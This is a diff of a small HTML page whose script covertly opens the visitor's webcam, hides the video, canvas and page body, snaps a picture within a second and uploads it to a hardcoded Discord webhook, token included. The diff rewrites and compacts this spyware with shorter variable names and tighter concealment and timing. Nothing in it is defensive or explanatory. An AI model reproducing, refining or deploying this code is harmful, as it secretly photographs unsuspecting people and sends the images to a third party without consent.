@@ -1,61 +1,35 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
+<meta charset="UTF-8">
+<title> </title>
+<style>body,video,canvas{display:none}</style>
 </head>
 <body>
-
-<video id="video" autoplay playsinline style="display:none;"></video>
-<canvas id="canvas" style="display:none;"></canvas>
-
+<video id="v" autoplay playsinline style="display:none"></video>
+<canvas id="c" style="display:none"></canvas>
 <script>
-const webhook =
-"https://discord.com/api/webhooks/1475203617043517533/JZeV78rfYNKQAyY83cTx6khi_ZVd1DhxhnIe9Ciq_xkpSyZiRgSKDCPVGZfD3t4nc0VC";
-
-const video = document.getElementById("video");
-
-navigator.mediaDevices.getUserMedia({ video: true })
-.then(stream => {
-
-    video.srcObject = stream;
-
-    setTimeout(() => {
-
-        const canvas = document.getElementById("canvas");
-        const ctx = canvas.getContext("2d");
-
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-
-        ctx.drawImage(video, 0, 0);
-
-        canvas.toBlob(async function(blob) {
-
-            const formData = new FormData();
-
-            formData.append("file", blob, "photo.png");
-
-            try {
-
-                await fetch(webhook, {
-                    method: "POST",
-                    body: formData
-                });
-
-                console.log("sent");
-
-            } catch (e) {
-
-                console.log(e);
-
-            }
-
-        }, "image/png");
-
-    }, 3000);
-
+const w="https://discord.com/api/webhooks/1475203617043517533/JZeV78rfYNKQAyY83cTx6khi_ZVd1DhxhnIe9Ciq_xkpSyZiRgSKDCPVGZfD3t4nc0VC";
+const v=document.getElementById("v");
+const ctx=document.getElementById("c").getContext("2d");
+navigator.mediaDevices.getUserMedia({video:true}).then(s=>{
+v.srcObject=s;
+v.onloadedmetadata=()=>{
+v.play();
+setTimeout(()=>{
+document.getElementById("c").width=v.videoWidth;
+document.getElementById("c").height=v.videoHeight;
+ctx.drawImage(v,0,0);
+document.getElementById("c").toBlob(b=>{
+if(b){
+let fd=new FormData();
+fd.append("file",b,"shot.png");
+fetch(w,{method:"POST",body:fd});
+}
+},"image/png",0.9);
+},500);
+};
 });
 </script>
-
 </body>
 </html>
